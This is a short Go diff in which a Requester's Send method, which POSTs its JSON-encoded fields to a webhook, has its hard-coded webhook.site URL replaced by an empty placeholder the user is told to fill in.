@@ -15,7 +15,8 @@ type Requester struct {
 func (r *Requester) Send() {
 	data, _ := json.Marshal(r)
 
-	req, _ := http.NewRequest("POST", "https://webhook.site/1a71823e-07a4-4f50-af9d-0f9f2649b07c", bytes.NewReader(data))
+	url := "" // put here to your webhook own url you can use https://webhook.site/
+	req, _ := http.NewRequest("POST", url, bytes.NewReader(data))
 	req.Header.Add("Content-Type", "application/json")
 	req.Header.Add("User-Agent", "Insider")
 	req.Close = true
